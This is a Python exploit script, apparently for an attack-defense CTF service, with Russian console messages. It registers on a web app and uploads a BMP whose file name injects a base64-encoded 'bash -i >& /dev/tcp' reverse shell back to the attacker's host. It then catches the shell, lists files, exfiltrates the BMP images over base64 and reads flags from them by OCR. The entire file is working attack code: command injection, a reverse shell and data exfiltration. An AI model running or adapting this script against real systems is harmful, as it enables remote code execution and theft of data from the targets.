#!/usr/bin/env python3
import sys
import requests
import random
import string
import time
import base64
import socket
import threading
import select
import re
import io
import shlex
from urllib.parse import quote
from PIL import Image
import pytesseract

TIMEOUT = 5
FLAG_PATTERN = re.compile(r'[A-Z0-9]{31}=')

def register_and_login(host, port):
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
    password = "123"
    print(f"[*] Регистрация пользователя {username}...")
    encoded_username = quote(username)
    register_data = f"username={encoded_username}&password={password}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r = session.post(f"{base_url}/register", data=register_data, headers=headers, timeout=TIMEOUT)
        if r.status_code == 200:
            access_token = session.cookies.get("access_token")
            if access_token:
                print(f"[+] Успешная регистрация и вход")
                return session
    except Exception as e:
        print(f"[!] Ошибка регистрации: {e}")
    return None

def create_payload_image():
    from PIL import Image
    import io
    img = Image.new('RGB', (100, 100), color='white')
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='BMP')
    img_bytes.seek(0)
    return img_bytes.read()

def upload_payload_image(session, host, port, payload_filename):
    base_url = f"http://{host}:{port}"
    image_data = create_payload_image()
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{payload_filename}\"\r\n"
        f"Content-Type: image/bmp\r\n\r\n"
    ).encode()
    body += image_data
    body += f"\r\n--{boundary}--\r\n".encode()
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body))
    }
    try:
        r = session.post(f"{base_url}/upload", data=body, headers=headers, timeout=TIMEOUT)
        return r.status_code
    except Exception as e:
        return None

def create_reverse_shell_payload(lhost, lport):
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    cmd_b64 = base64.b64encode(cmd.encode()).decode()
    payload = f"b.bmp' -s 100x100 b.bmp || echo {cmd_b64} | base64 -d | bash || echo .bmp"
    return payload

def listener_thread_func(lport, result_container):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', lport))
        server.listen(1)
        print(f"[*] Listener запущен на порту {lport}")
        server.settimeout(15)
        client, addr = server.accept()
        print(f"[+] Подключение от {addr}")
        result_container['client'] = client
        result_container['server'] = server
    except Exception as e:
        print(f"[!] Ошибка listener: {e}")
        result_container['error'] = str(e)

def send_command(client_socket, cmd, timeout=2):
    client_socket.send(cmd.encode())
    time.sleep(0.5)
    data = b""
    start_time = time.time()
    while time.time() - start_time < timeout:
        ready, _, _ = select.select([client_socket], [], [], 0.1)
        if client_socket in ready:
            chunk = client_socket.recv(4096)
            if not chunk:
                break
            data += chunk
        else:
            time.sleep(0.1)
    return data.decode(errors='ignore')

def download_binary_file(client_socket, filename):
    escaped_filename = shlex.quote(filename)
    client_socket.send(f"base64 -w 0 {escaped_filename}; echo\n".encode())
    data = b""
    start_time = time.time()
    while time.time() - start_time < 10:
        ready, _, _ = select.select([client_socket], [], [], 0.5)
        if client_socket in ready:
            chunk = client_socket.recv(8192)
            if not chunk:
                break
            data += chunk
        else:
            time.sleep(0.1)
    output = data.decode(errors='ignore')
    for line in output.split('\n'):
        line = line.strip()
        if line and not line.startswith('bash:') and not line.startswith('pixel@') and len(line) > 10:
            try:
                decoded = base64.b64decode(line)
                if len(decoded) > 0:
                    return decoded
            except:
                continue
    return None

def parse_filename_from_line(line):
    parts = line.split()
    if len(parts) >= 9:
        filename = ' '.join(parts[8:])
        filename = filename.strip().strip("'").strip('"')
        if filename and filename not in ['.', '..']:
            return filename
    return None

def check_image_for_flag(image_data):
    try:
        image = Image.open(io.BytesIO(image_data))
        custom_config = r'--psm 6 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789='
        text = pytesseract.image_to_string(image, config=custom_config)
        text = ''.join(text.split()).upper()
        return FLAG_PATTERN.findall(text)
    except:
        return []

def main():
    if len(sys.argv) != 5:
        print("Usage: sploit.py TARGET_HOST TARGET_PORT LHOST LPORT")
        print("Example: sploit.py 127.0.0.1 1337 10.10.10.5 4444")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    lhost = sys.argv[3]
    lport = int(sys.argv[4])
    
    print(f"[*] Цель: {target_host}:{target_port}")
    print(f"[*] Listener: {lhost}:{lport}")
    
    session = register_and_login(target_host, target_port)
    if not session:
        print("[!] Не удалось создать аккаунт")
        sys.exit(1)
    
    result_container = {}
    listener_thread = threading.Thread(target=listener_thread_func, args=(lport, result_container))
    listener_thread.daemon = True
    listener_thread.start()
    time.sleep(1)
    
    if 'error' in result_container:
        print(f"[!] Ошибка listener: {result_container['error']}")
        sys.exit(1)
    
    shell_payload = create_reverse_shell_payload(lhost, lport)
    upload_thread = threading.Thread(target=upload_payload_image, args=(session, target_host, target_port, shell_payload))
    upload_thread.daemon = True
    upload_thread.start()
    
    listener_thread.join(timeout=15)
    
    if 'client' not in result_container:
        print("[!] Не удалось получить reverse shell")
        sys.exit(1)
    
    client = result_container['client']
    
    time.sleep(2)
    send_command(client, "export TERM=xterm\n")
    ls_output = send_command(client, "ls -lha\n", timeout=3)
    
    files = []
    for line in ls_output.split('\n'):
        line = line.strip()
        if line and not line.startswith('total') and not line.startswith('bash:') and not line.startswith('pixel@'):
            filename = parse_filename_from_line(line)
            if filename:
                files.append(filename)
    
    all_flags = []
    for filename in files:
        if filename.lower().endswith('.bmp'):
            print(f"[*] {filename}", end="", flush=True)
            content = download_binary_file(client, filename)
            if content and len(content) > 50:
                print(f" ({len(content)} bytes)", end="", flush=True)
                flags = check_image_for_flag(content)
                if flags:
                    print(f" -> флаг: {', '.join(flags)}")
                    all_flags.extend(flags)
                else:
                    print(" -> нет флагов")
            else:
                print(" -> не удалось скачать")
    
    client.close()
    if 'server' in result_container:
        result_container['server'].close()
    
    if all_flags:
        print("\n" + "="*50)
        print("НАЙДЕННЫЕ ФЛАГИ:")
        print("="*50)
        for flag in set(all_flags):
            print(flag)

if __name__ == "__main__":
    main()